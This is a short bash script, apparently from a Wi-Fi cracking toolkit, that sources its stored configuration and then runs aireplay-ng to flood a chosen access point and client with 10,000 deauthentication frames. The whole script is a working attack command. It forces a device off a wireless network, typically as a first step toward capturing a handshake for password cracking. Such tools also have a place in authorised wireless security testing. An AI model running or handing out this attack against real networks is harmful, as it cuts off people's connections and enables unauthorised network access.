#!/bin/bash

PWD="$(pwd)"
CONFIG_DIR="$HOME/.wifi-crack"
CONFIG_FILE="$CONFIG_DIR/config"
source "$CONFIG_FILE"

source "$CONFIG_INTERFACE"

source "$CURRENT_ATTACK_FILE"
source "$CONFIG_ATTACK"

aireplay-ng --deauth 10000 -a "$BSSID" -c "$STATION" "$INTERFACE"

